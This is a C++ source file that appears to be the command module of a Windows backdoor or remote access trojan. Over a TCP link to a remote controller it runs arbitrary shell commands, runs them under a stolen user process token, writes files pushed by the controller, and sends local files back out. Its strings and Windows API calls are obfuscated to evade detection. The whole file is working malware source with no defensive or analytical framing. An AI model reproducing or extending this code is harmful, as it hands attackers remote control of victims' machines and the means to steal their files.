#include "commands.h"
#include "config.h"

void handle_ping_command(TCPClient client) {
    client.send_data(OBFUSCATE("pong"));
}

void handle_shell_command(TCPClient client) {
    auto data = client.receive();
    const auto output = exec(*data, nullptr);
    client.send_data(output.c_str());
}


void handle_shell_command_as_user(TCPClient client) {
    auto data = client.receive();
    AutoHandle token = get_token_of_user_process();
    if (token == INVALID_HANDLE_VALUE) {
        client.send_data(OBFUSCATE("Can't find a matching process?"));
        return;
    }
    const auto output = exec(*data, token);
    client.send_data(output.c_str());
}


void download_file(TCPClient client) {
    create_file_a_type create_file = WINAPI_OBFUSCATE(create_file_a_type, "CreateFileA", "kernel32");
    write_file_type write_file = WINAPI_OBFUSCATE(write_file_type, "WriteFile", "kernel32");
    const auto path = client.receive();
    AutoHandle file = create_file(*path, GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_ALWAYS, 0, nullptr);
    if (file == INVALID_HANDLE_VALUE) {
        client.send_data(OBFUSCATE("There was a problem with openning the file!"));
        return;
    }
    size_t bytes_received;
    auto data = client.receive(CHUNK_SIZE, &bytes_received);
    while (bytes_received == CHUNK_SIZE) {
        write_file(file, *data, bytes_received, nullptr, 0);
        data = client.receive(CHUNK_SIZE, &bytes_received);
    }
    write_file(file, *data, bytes_received, nullptr, 0);
    client.send_data(OBFUSCATE("File written successfully!"));
}


void upload_file(TCPClient client) {
    create_file_a_type create_file = WINAPI_OBFUSCATE(create_file_a_type, "CreateFileA", "kernel32");
    read_file_type read_file = WINAPI_OBFUSCATE(read_file_type, "ReadFile", "kernel32");
    const auto path = client.receive();
    AutoHandle file = create_file(*path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, nullptr);
    if (file == INVALID_HANDLE_VALUE) {
        client.send_data(OBFUSCATE("There was a problem with openning the file!"));
        return;
    }
    char chunk[CHUNK_SIZE];
    DWORD bytes_received;
    read_file(file, chunk, CHUNK_SIZE, &bytes_received, nullptr);
    while (bytes_received > 0) {
        client.send_data(chunk);
        read_file(file, chunk, CHUNK_SIZE, &bytes_received, nullptr);
    }
}